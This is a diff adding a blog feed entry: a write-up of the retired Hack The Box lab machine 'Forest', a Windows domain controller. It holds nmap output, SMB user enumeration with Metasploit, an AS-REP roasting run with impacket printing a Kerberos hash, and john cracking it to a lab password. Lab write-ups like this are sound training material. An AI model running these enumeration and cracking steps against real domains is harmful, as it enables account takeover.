@@ -1,5 +1,663 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-03-15T09:30:00+01:00</updated><entry><title>HTB: Postman</title><link href="https://maggick.fr/2020/03/htb-postman.html" rel="alternate"></link><published>2020-03-15T09:30:00+01:00</published><updated>2020-03-15T09:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-15:/2020/03/htb-postman.html</id><summary type="html">&lt;p&gt;&lt;img alt="Postman Card" class="align-left" src="/media/2020.03/postman_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-03-21T17:10:00+01:00</updated><entry><title>HTB: Forest</title><link href="https://maggick.fr/2020/03/htb-forest.html" rel="alternate"></link><published>2020-03-21T17:10:00+01:00</published><updated>2020-03-21T17:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-21:/2020/03/htb-forest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/212"&gt;Forest&lt;/a&gt; published by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on October the 12th
+2019.
+This box is a Windows machine classified as easy.
+The server is a Domain Controller with 24 open ports.
+We will use Winrm, bloodhound and impacket to get both the user flag and the
+"root" flag.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.03/forest_card.png" alt="Forest card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/212"&gt;Forest&lt;/a&gt; published by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on October the 12th
+2019.
+This box is a Windows machine classified as easy.
+The server is a Domain Controller with 24 open ports.
+We will use Winrm, bloodhound and impacket to get both the user flag and the
+"root" flag.&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#port-88-kerberos"&gt;Port 88: Kerberos&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-m135-msrpc"&gt;Port M135: MSRPC&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-139-smb"&gt;Port 139: SMB&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ports-389-and-636-ldap"&gt;Ports 389 and 636: LDAP&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ports-445-464-593-3269-49664-49665-49666-49667-49669-49676-49677-49684-49706-49915"&gt;Ports 445, 464, 593, 3269, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49684, 49706, 49915&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-5985-winrm"&gt;Port 5985: WinRM&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-3268-globalcatldap"&gt;Port 3268: globalcatLdap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-9389"&gt;Port 9389&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#port-47001-windows-remote-management-service"&gt;Port 47001: Windows Remote Management Service&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-user"&gt;Getting user&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#enumerating-user-with-smb"&gt;enumerating user with SMB&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-npusers"&gt;Getting NPUsers&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ms14-068"&gt;MS14-068&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#evil-winrm"&gt;Evil-winrm&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#getting-root"&gt;Getting root&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#evil-winrm-and-binary"&gt;evil-winrm and binary&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bloodhound"&gt;Bloodhound&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#exchange-trusted-subsystem-and-ntlmrelayx"&gt;Exchange trusted subsystem and ntlmrelayx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#dcsync"&gt;DCSync&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#pth"&gt;PTH&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;p&gt;We start with an nmap scan. 24 ports are open. Using the service detection with
+gather several informations about the box:
+  * The server is a MS Windows Server 2008 R2
+  * The server is in the htb.local domain
+  * The server is in the HTB workgroup&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Oct 24 09:17:28 2019 as: nmap -p- -sSV -oA nmap_ssv 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.094s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65511 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE      VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    open  domain?&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-24 07:29:09Z)&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)&lt;/span&gt;
+&lt;span class="code-line"&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
+&lt;span class="code-line"&gt;593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;9389/tcp  open  mc-nmf       .NET Message Framing&lt;/span&gt;
+&lt;span class="code-line"&gt;47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;49664/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49665/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49666/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49667/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49669/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;49677/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49684/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49706/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49915/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
+&lt;span class="code-line"&gt;SF-Port53-TCP:V=7.80%I=7%D=10/24%Time=5DB150FF%P=x86_64-pc-linux-gnu%r(DNS&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:VersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version&lt;/span&gt;
+&lt;span class="code-line"&gt;SF:\x04bind\0\0\x10\0\x03&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Read data files from: /usr/bin/../share/nmap&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We use &lt;code&gt;getArch.py&lt;/code&gt; from &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt;
+to determine the machine Architecture, the machine is 64-bits.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python getArch.py -target 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Gathering OS architecture for 1 machines&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Socket connect timeout set to 2 secs&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.161 is 64-bi&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We check the open ports using &lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html"&gt;a useful website&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id="port-88-kerberos"&gt;Port 88: Kerberos&lt;/h2&gt;
+&lt;p&gt;We need an account to exploit this port.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Kerberos is a protocol that is used for network authentication. Different versions are used by Unix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.&lt;/p&gt;
+&lt;p&gt;If you already have a login to a user of that domain you might be able to escalate that privilege.&lt;/p&gt;
+&lt;p&gt;Check out: MS14-068&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="port-m135-msrpc"&gt;Port M135: MSRPC&lt;/h2&gt;
+&lt;p&gt;We enumerate using &lt;code&gt;nmap&lt;/code&gt; and metasploit without success.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This is the windows rpc-port. &lt;a href="https://en.wikipedia.org/wiki/Microsoft_RPC"&gt;https://en.wikipedia.org/wiki/Microsoft_RPC&lt;/a&gt;
+Enumerate
+nmap 192.168.0.101 --script=msrpc-enum&lt;/p&gt;
+&lt;p&gt;msf &amp;gt; use exploit/windows/dcerpc/ms03_026_dcom&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="port-139-smb"&gt;Port 139: SMB&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="ports-389-and-636-ldap"&gt;Ports 389 and 636: LDAP&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.&lt;/p&gt;
+&lt;p&gt;You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.&lt;/p&gt;
+&lt;p&gt;ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="ports-445-464-593-3269-49664-49665-49666-49667-49669-49676-49677-49684-49706-49915"&gt;Ports 445, 464, 593, 3269, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49684, 49706, 49915&lt;/h2&gt;
+&lt;p&gt;Not included in the gitbook&lt;/p&gt;
+&lt;h2 id="port-5985-winrm"&gt;Port 5985: WinRM&lt;/h2&gt;
+&lt;p&gt;Not included in the gitbook but a "well known" protocol.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;WinRM, or Windows Remote Management, is an HTTP based remote management and shell protocol for Windows. The Windows Remote Management Service is responsible for this functionality. If WinRM is not configured for remote access, but the service is started, it listens for local requests on TCP port 47001. If you create listener it will still listen on 47001, but also on the default TCP ports 5985 (HTTP) and 5986 (HTTPS).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="port-3268-globalcatldap"&gt;Port 3268: globalcatLdap&lt;/h2&gt;
+&lt;p&gt;No description&lt;/p&gt;
+&lt;h2 id="port-9389"&gt;Port 9389&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="port-47001-windows-remote-management-service"&gt;Port 47001: Windows Remote Management Service&lt;/h2&gt;
+&lt;p&gt;No more information.&lt;/p&gt;
+&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
+&lt;h2 id="enumerating-user-with-smb"&gt;enumerating user with SMB&lt;/h2&gt;
+&lt;p&gt;The SMB port is open, we can enumerate local users. Moreover, as the server is a Domain
+Controller, every "local" user is a domain user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_enumusers&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; set rhosts 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;rhosts =&amp;gt; 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (auxiliary/scanner/smb/smb_enumusers):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBDomain  .                no        The Windows domain to use for authentication&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBPass                     no        The password for the specified username&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBUser                     no        The username to authenticate as&lt;/span&gt;
+&lt;span class="code-line"&gt;  THREADS    1                yes       The number of concurrent threads&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] 10.10.10.161:445      - HTB [ Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad, HealthMailboxc0a90c9, HealthMailbox670628e, HealthMailbox968e74d, HealthMailbox6ded678, HealthMailbox83d6781, HealthMailboxfd87238, HealthMailboxb01ac64, HealthMailbox7108a4e, HealthMailbox0659cc1, sebastien, lucinda, svc-alfresco, andy, mark, santi ] ( LockoutTries=0 PasswordMin=7 )&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Auxiliary module execution completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="getting-npusers"&gt;Getting NPUsers&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;UF_DONT_REQUIRE_PREAUTH&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This bit indicates that there is no so-called pre-authentication necessary for Kerberos authentication of the account. This is only for older Kerberos client important, which need to login to the domain from foreign systems and which does not support Kerberos pre-authentication. For accounts that log on from a Windows machine, or just for machine accounts of Windows domain members, this flag flag should NEVER be set, for the pre-authentication prevents certain types of dictionary attacks on the Kerberos login.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We create a file with the users.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat users.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;sebastien&lt;/span&gt;
+&lt;span class="code-line"&gt;lucinda&lt;/span&gt;
+&lt;span class="code-line"&gt;svc-alfresco&lt;/span&gt;
+&lt;span class="code-line"&gt;andy&lt;/span&gt;
+&lt;span class="code-line"&gt;mark&lt;/span&gt;
+&lt;span class="code-line"&gt;santi&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In order to use &lt;a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"&gt;impacket's&lt;/a&gt; &lt;code&gt;GetNPUsers.py&lt;/code&gt;
+we need to add an entry in our &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/hosts&lt;/span&gt;
+&lt;span class="code-line"&gt;127.0.0.1   localhost&lt;/span&gt;
+&lt;span class="code-line"&gt;127.0.1.1   kalili&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.161    htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;10.10.10.161    forest.htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And we launch &lt;a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"&gt;impacket's&lt;/a&gt; &lt;code&gt;GetNPUsers.py&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User sebastien doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User lucinda doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
+&lt;span class="code-line"&gt;$krb5asrep$svc-alfresco@HTB.LOCAL:bcd2217d8b5e6884e25d8b2860dd0380$40be3fda5f8fd984f9c576d5dfa33f37effc76b0fbff3ae28a747825c3559bfea4a6a23ad1c0add8ad61d149a5ccc2e79919de9b78e8720b3dc79af96364fb6f5d7e0235eb83850765023a30de6d172c82ec751f50f4c6e4971cb54a46e16ec2d3a41b9f44b6b8e85782d958c3ff665baa5b29d8c5b4516ec1b63f7c63b55c5fa74b7b1b5fe1fa04cddac6812d0ef37f1e25ab8e8005fe7f6ce949786435c41a2395e73e9bf1de57e3a2da12a00f9da25408e92a37a5ed2dacdbbf3846963000f7b2f8d337d152345a9cc7358b5d45224abeac179f081b9b329e549659da00ac791a7fde1a8c&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User andy doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User mark doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User santi doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] invalid principal syntax&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We crack the password using john and the rockyou dictionary. The user's
+password is "s3rvice".&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hashes -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;krb5asrep&amp;quot;, but the string is also recognized as &amp;quot;krb5asrep-aes-opencl&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--format=krb5asrep-aes-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])&lt;/span&gt;
+&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;0g 0:00:00:02 11.59% (ETA: 11:52:21) 0g/s 913958p/s 913958c/s 913958C/s eddie707..eck1956&lt;/span&gt;
+&lt;span class="code-line"&gt;s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)&lt;/span&gt;
+&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-10-24 11:52) 0.2237g/s 914040p/s 914040c/s 914040C/s s401413..s3r1bu&lt;/span&gt;
+&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
+&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="ms14-068"&gt;MS14-068&lt;/h2&gt;
+&lt;p&gt;In order to run MS14-068 we need the SUID of our user. We enumerate them using
+metasploit. Our user SID is &lt;code&gt;S-1-5-21-3072663084-364016917-1341370565-1147&lt;/code&gt; (domain
+SID-User RID).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &amp;gt; use auxiliary/scanner/smb/smb_lookupsid&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; show options&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Module options (auxiliary/scanner/smb/smb_lookupsid):&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  MaxRID     4000             no        Maximum RID to check&lt;/span&gt;
+&lt;span class="code-line"&gt;  MinRID     500              no        Starting RID to check&lt;/span&gt;
+&lt;span class="code-line"&gt;  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBDomain  .                no        The Windows domain to use for authentication&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBPass                     no        The password for the specified username&lt;/span&gt;
+&lt;span class="code-line"&gt;  SMBUser                     no        The username to authenticate as&lt;/span&gt;
+&lt;span class="code-line"&gt;  THREADS    1                yes       The number of concurrent threads&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Auxiliary action:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  Name   Description&lt;/span&gt;
+&lt;span class="code-line"&gt;  ----   -----------&lt;/span&gt;
+&lt;span class="code-line"&gt;  LOCAL  Enumerate local accounts&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set RHOSTS 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;RHOSTS =&amp;gt; 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBDomain HTB.LOCAL&lt;/span&gt;
+&lt;span class="code-line"&gt;SMBDomain =&amp;gt; HTB.LOCAL&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBUser svc-alfresco&lt;/span&gt;
+&lt;span class="code-line"&gt;SMBUser =&amp;gt; svc-alfresco&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; set SMBPass s3rvice&lt;/span&gt;
+&lt;span class="code-line"&gt;SMBPass =&amp;gt; s3rvice&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_lookupsid) &amp;gt; run&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - PIPE(LSARPC) LOCAL(HTB - 5-21-3072663084-364016917-1341370565) DOMAIN(HTB - 5-21-3072663084-364016917-1341370565)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=Administrator RID=500&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=lucinda RID=1146&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=svc-alfresco RID=1147&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - GROUP=Service Accounts RID=1148&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - GROUP=Privileged IT Accounts RID=1149&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=andy RID=1150&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=mark RID=1151&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] 10.10.10.161:445      - USER=santi RID=1152&lt;/span&gt;
